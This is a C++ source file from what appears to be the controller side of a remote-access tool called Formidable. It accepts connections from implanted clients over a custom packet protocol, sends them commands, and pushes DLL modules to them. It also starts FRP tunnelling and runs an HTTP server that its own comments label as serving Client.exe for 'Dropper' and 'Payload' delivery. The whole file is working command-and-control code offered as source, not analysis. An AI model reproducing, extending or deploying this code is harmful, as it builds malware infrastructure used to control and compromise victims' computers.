#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include "NetworkManager.h"
#include "../../thirdparty/Include/HPSocket/HPSocket.h"
#include "../NetworkHelper.h"
#include "../../Common/ClientTypes.h"
#include "../GlobalState.h"
#include "../StringUtils.h"
#include "../MainWindow.h"
#include "../Core/CommandHandler.h"
#include "../resource.h"
#include "../../Common/Utils.h"
#include <vector>

namespace Formidable {
namespace Network {

// 静态成员初始化
NetworkServer* NetworkManager::s_pServer = nullptr;
IHttpServer* NetworkManager::s_pHttpServer = nullptr;
std::map<CONNID, std::vector<BYTE>> NetworkManager::s_recvBuffers;
std::mutex NetworkManager::s_recvBufferMutex;

// 初始化网络服务
bool NetworkManager::Initialize(int port) {
    // 创建HPSocket服务器
    s_pServer = new NetworkServer();
    g_pNetworkServer = s_pServer;
    
    // 设置回调
    s_pServer->SetOnConnect([](CONNID connId, const char* ip) { NetworkManager::OnConnect(connId, ip); });
    s_pServer->SetOnReceive([](CONNID connId, const BYTE* pData, int iLength) { NetworkManager::OnReceive(connId, pData, iLength); });
    s_pServer->SetOnClose([](CONNID connId) { NetworkManager::OnClose(connId); });
    
    // 启动服务器
    if (!s_pServer->Start("0.0.0.0", (USHORT)port)) {
        g_pNetworkServer = nullptr;
        EnSocketError errCode = s_pServer->GetLastError();
        int wsaErr = WSAGetLastError();
        
        std::wstring errMsg = L"启动HPSocket服务器失败\n端口: " + std::to_wstring(port) + 
                             L"\n错误码: " + std::to_wstring((int)errCode);
        
        if (errCode == SE_SOCKET_CREATE || errCode == SE_SOCKET_BIND || errCode == SE_SOCKET_LISTEN) {
            errMsg += L" (WSAError: " + std::to_wstring(wsaErr) + L")";
        }
        
        switch (errCode) {
            case SE_ILLEGAL_STATE:
                errMsg += L"\n原因: 服务器已启动或状态非法";
                break;
            case SE_SOCKET_CREATE:
                errMsg += L"\n原因: 创建Socket失败";
                break;
            case SE_SOCKET_BIND:
                errMsg += L"\n原因: 绑定端口失败（端口可能被占用）";
                break;
            case SE_SOCKET_LISTEN:
                errMsg += L"\n原因: 监听失败";
                break;
            case SE_NETWORK:
                errMsg += L"\n原因: 网络错误";
                break;
            default:
                errMsg += L"\n原因: 未知错误";
                break;
        }
        
        AddLog(L"错误", errMsg);
        
        delete s_pServer;
        s_pServer = nullptr;
        return false;
    }
    
    AddLog(L"系统", L"网络服务已启动，监听端口: " + std::to_wstring(port));
    
    // 启动 HTTP 服务 (用于 Dropper 下载)
    InitializeHttpServer(g_Settings.frpDownloadPort > 0 ? g_Settings.frpDownloadPort : port + 1);

    // 启动 FRP
    extern void StartFrp();
    StartFrp();
    
    return true;
}

// 关闭网络服务
void NetworkManager::Shutdown() {
    ShutdownHttpServer();
    if (s_pServer) {
        s_pServer->Stop();
        delete s_pServer;
        s_pServer = nullptr;
    }
    
    std::lock_guard<std::mutex> lock(s_recvBufferMutex);
    s_recvBuffers.clear();
}

// 发送数据到客户端
bool NetworkManager::SendToClient(std::shared_ptr<ConnectedClient> client, const void* data, int length) {
    if (!s_pServer) return false;

    if (!client || !client->active) return false;
    
    return s_pServer->Send(client->connId, (const BYTE*)data, length);
}

// 发送命令到客户端
bool NetworkManager::SendCommand(uint32_t clientId, uint32_t cmd, uint32_t arg1, uint32_t arg2, const std::string& data) {
    std::shared_ptr<ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (g_Clients.count(clientId)) client = g_Clients[clientId];
    }
    if (!client) return false;

    size_t bodySize = sizeof(CommandPkg) + data.size();
    std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
    
    PkgHeader* header = (PkgHeader*)buffer.data();
    memcpy(header->flag, "FRMD26?", 7);
    header->originLen = (int)bodySize;
    header->totalLen = (int)buffer.size();
    
    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = arg1;
    pkg->arg2 = arg2;
    
    if (!data.empty()) {
        memcpy(pkg->data, data.data(), data.size());
    }
    
    return SendToClient(client, buffer.data(), (int)buffer.size());
}

// 发送模块到客户端
bool NetworkManager::SendModule(uint32_t clientId, uint32_t cmd, const std::wstring& dllName, uint32_t arg2) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (g_Clients.count(clientId)) client = g_Clients[clientId];
    }
    if (!client) return false;

    std::vector<char> dllData;
    
    wchar_t szExePath[MAX_PATH];
    GetModuleFileNameW(NULL, szExePath, MAX_PATH);
    std::wstring masterDir = szExePath;
    size_t lastSlash = masterDir.find_last_of(L"\\/");
    masterDir = masterDir.substr(0, lastSlash + 1);

    std::vector<std::wstring> searchPaths;
    bool use64Bit = (client->info.is64Bit != 0);
    
    if (use64Bit) {
        searchPaths.push_back(masterDir + L"x64\\" + dllName);
        searchPaths.push_back(masterDir + L"Formidable2026\\x64\\" + dllName);
    } else {
        searchPaths.push_back(masterDir + L"x86\\" + dllName);
        searchPaths.push_back(masterDir + L"Formidable2026\\x86\\" + dllName);
    }
    searchPaths.push_back(masterDir + dllName);

    for (const auto& dllPath : searchPaths) {
        HANDLE hFile = CreateFileW(dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            if (fileSize > 0) {
                dllData.resize(fileSize);
                DWORD bytesRead;
                if (ReadFile(hFile, dllData.data(), fileSize, &bytesRead, NULL) && bytesRead == fileSize) {
                    AddLog(L"系统", L"加载模块: " + dllName + (use64Bit ? L" (x64)" : L" (x86)"));
                    CloseHandle(hFile);
                    goto data_ready;
                }
            }
            CloseHandle(hFile);
        }
    }

    if (dllData.empty()) {
        int resId = GetResourceIdFromDllName(dllName, use64Bit);
        if (resId == 0) {
            AddLog(L"错误", L"未找到匹配的模块资源: " + dllName);
            return false;
        }
        if (!GetResourceData(resId, dllData)) {
            AddLog(L"错误", L"加载资源失败: " + dllName);
            return false;
        }
    }

data_ready:
    size_t fileSize = dllData.size();
    size_t bodySize = sizeof(CommandPkg) + fileSize;
    std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
    
    PkgHeader* header = (PkgHeader*)buffer.data();
    memcpy(header->flag, "FRMD26?", 7);
    header->originLen = (int)bodySize;
    header->totalLen = (int)buffer.size();
    
    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = (uint32_t)fileSize;
    pkg->arg2 = arg2;
    memcpy(pkg->data, dllData.data(), fileSize);
    
    return SendToClient(client, buffer.data(), (int)buffer.size());
}

// 断开客户端
void NetworkManager::DisconnectClient(CONNID connId) {
    if (s_pServer) {
        s_pServer->Disconnect(connId);
    }
}

// HPSocket回调：客户端连接
void NetworkManager::OnConnect(CONNID connId, const char* lpszRemoteIP) {
    auto client = std::make_shared<ConnectedClient>();
    client->connId = connId;
    client->ip = lpszRemoteIP;
    client->port = 0; // 我们无法从这里直接获取端口，但之后可以通过 GetClientAddress 获取
    client->active = true;
    
    uint32_t clientId;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        clientId = g_NextClientId++;
        g_Clients[clientId] = client;
        client->clientId = clientId;
    }
    
    {
        std::lock_guard<std::mutex> lock(g_ConnIdMapMutex);
        g_ConnIdToClientId[connId] = clientId;
    }
    
    AddLog(L"连接", ToWString(client->ip) + L" 已连接");
}

// HPSocket回调：接收数据
void NetworkManager::OnReceive(CONNID connId, const BYTE* pData, int iLength) {
    uint32_t clientId = 0;
    {
        std::lock_guard<std::mutex> lock(g_ConnIdMapMutex);
        auto it = g_ConnIdToClientId.find(connId);
        if (it != g_ConnIdToClientId.end()) {
            clientId = it->second;
        }
    }
    
    if (clientId > 0) {
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) return;

        // 将收到的数据追加到缓冲区
        client->recvBuffer.insert(client->recvBuffer.end(), pData, pData + iLength);

        // 循环处理缓冲区中所有完整的包
        while (client->recvBuffer.size() >= sizeof(PkgHeader)) {
            PkgHeader* header = (PkgHeader*)client->recvBuffer.data();
            
            // 验证包头标志
            if (memcmp(header->flag, "FRMD26?", 7) != 0) {
                // 非法数据，清空缓冲区并断开
                client->recvBuffer.clear();
                s_pServer->Disconnect(connId);
                break;
            }

            int totalPkgLen = header->totalLen;
            if (client->recvBuffer.size() >= (size_t)totalPkgLen) {
                // 提取包体数据
                const BYTE* pkgBody = client->recvBuffer.data() + sizeof(PkgHeader);
                int bodyLen = header->originLen;

                // 处理包体数据
                Formidable::Core::CommandHandler::HandlePacket(clientId, pkgBody, bodyLen);

                // 从缓冲区移除已处理的数据
                client->recvBuffer.erase(client->recvBuffer.begin(), client->recvBuffer.begin() + totalPkgLen);
            } else {
                // 数据包不完整，等待下一次接收
                break;
            }
        }
    }
}

// HPSocket回调：客户端断开
void NetworkManager::OnClose(CONNID connId) {
    uint32_t clientId = 0;
    {
        std::lock_guard<std::mutex> lock(g_ConnIdMapMutex);
        auto it = g_ConnIdToClientId.find(connId);
        if (it != g_ConnIdToClientId.end()) {
            clientId = it->second;
            g_ConnIdToClientId.erase(it);
        }
    }
    
    if (clientId > 0) {
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            auto it = g_Clients.find(clientId);
            if (it != g_Clients.end()) {
                client = it->second;
                g_Clients.erase(it);
            }
        }
        
        if (client) {
            client->active = false;
            AddLog(L"断开", ToWString(client->ip) + L" 已断开");

            // 从 UI 列表中移除
            if (client->listIndex >= 0) {
                SendMessageW(g_hListClients, LVM_DELETEITEM, client->listIndex, 0);
                
                // 更新后面项的 listIndex
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                for (auto& pair : g_Clients) {
                    if (pair.second->listIndex > client->listIndex) {
                        pair.second->listIndex--;
                    }
                }
            }
        }
        
        UpdateStatusBar();
    }
}

// HTTP Server 实现
class CLocalHttpServerListener : public ::CHttpServerListener {
public:
    virtual EnHttpParseResult OnMessageBegin(IHttpServer* pSender, CONNID dwConnID) override {
        return HPR_OK;
    }
    virtual EnHttpParseResult OnRequestLine(IHttpServer* pSender, CONNID dwConnID, LPCSTR lpszMethod, LPCSTR lpszUrl) override {
        std::string url = lpszUrl;
        AddLog(L"HTTP", L"收到请求: " + ToWString(url));

        wchar_t szExePath[MAX_PATH];
        GetModuleFileNameW(NULL, szExePath, MAX_PATH);
        std::wstring masterDir = szExePath;
        size_t lastSlash = masterDir.find_last_of(L"\\/");
        masterDir = masterDir.substr(0, lastSlash + 1);

        std::wstring filePath;
        if (url == "/Client.exe") {
            filePath = masterDir + L"x86\\Client.exe";
        } else if (url == "/Client_x64.exe") {
            filePath = masterDir + L"x64\\Client.exe";
        }

        if (!filePath.empty() && GetFileAttributesW(filePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            // 发送文件
            // HPSocket 4C/C++ API: SendLocalFile 接受 LPCSTR 路径
            std::string pathAnsi = WideToUTF8(filePath);
            
            THeader header;
            header.name = "Content-Type";
            header.value = "application/octet-stream";
            
            pSender->SendLocalFile(dwConnID, pathAnsi.c_str(), 200, "OK", &header, 1);
            
            AddLog(L"HTTP", L"已发送文件: " + filePath);
        } else {
            pSender->SendResponse(dwConnID, 404, "Not Found");
        }
        return HPR_OK;
    }
    virtual EnHttpParseResult OnHeadersComplete(IHttpServer* pSender, CONNID dwConnID) override { return HPR_OK; }
    virtual EnHttpParseResult OnBody(IHttpServer* pSender, CONNID dwConnID, const BYTE* pData, int iLength) override { return HPR_OK; }
    virtual EnHttpParseResult OnMessageComplete(IHttpServer* pSender, CONNID dwConnID) override { return HPR_OK; }
    virtual EnHttpParseResult OnParseError(IHttpServer* pSender, CONNID dwConnID, int iErrorCode, LPCSTR lpszErrorDesc) override { return HPR_OK; }
    virtual EnHandleResult OnClose(ITcpServer* pSender, CONNID dwConnID, EnSocketOperation enOperation, int iErrorCode) override { return HR_OK; }
};

static CLocalHttpServerListener s_httpListener;

bool NetworkManager::InitializeHttpServer(int port) {
    s_pHttpServer = HP_Create_HttpServer(&s_httpListener);
    if (!s_pHttpServer) return false;

    if (!s_pHttpServer->Start("0.0.0.0", (USHORT)port)) {
        AddLog(L"错误", L"启动 HTTP 服务器失败 (端口: " + std::to_wstring(port) + L")");
        HP_Destroy_HttpServer(s_pHttpServer);
        s_pHttpServer = nullptr;
        return false;
    }

    AddLog(L"系统", L"HTTP 服务已启动 (用于 Payload 投放)，监听端口: " + std::to_wstring(port));
    return true;
}

void NetworkManager::ShutdownHttpServer() {
    if (s_pHttpServer) {
        s_pHttpServer->Stop();
        HP_Destroy_HttpServer(s_pHttpServer);
        s_pHttpServer = nullptr;
    }
}

} // namespace Network
} // namespace Formidable
